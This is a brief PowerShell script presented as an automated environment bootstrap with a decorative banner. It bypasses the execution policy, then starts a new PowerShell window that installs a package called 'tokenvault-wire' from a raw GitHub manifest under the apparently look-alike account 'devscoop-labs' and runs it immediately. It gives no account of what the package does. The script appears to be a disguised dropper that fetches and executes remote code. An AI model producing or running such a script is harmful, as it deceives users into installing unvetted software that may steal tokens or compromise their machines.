
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
Write-Host "                                              |_|    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkGray
Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""


Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Automated installation will begin shortly." -ForegroundColor White
Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
Write-Host ""

 

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "tokenvault-wire"
$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"

$scriptBlock = @"
`$packageName = '$packageName'
`$installUrl = '$installUrl'
`$appPath = "`$env:USERPROFILE\scoop\apps\`$packageName"

if (!(Test-Path `$appPath)) {
    scoop install `$installUrl
    wire
}
"@

Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptBlock -WorkingDirectory (Get-Location)
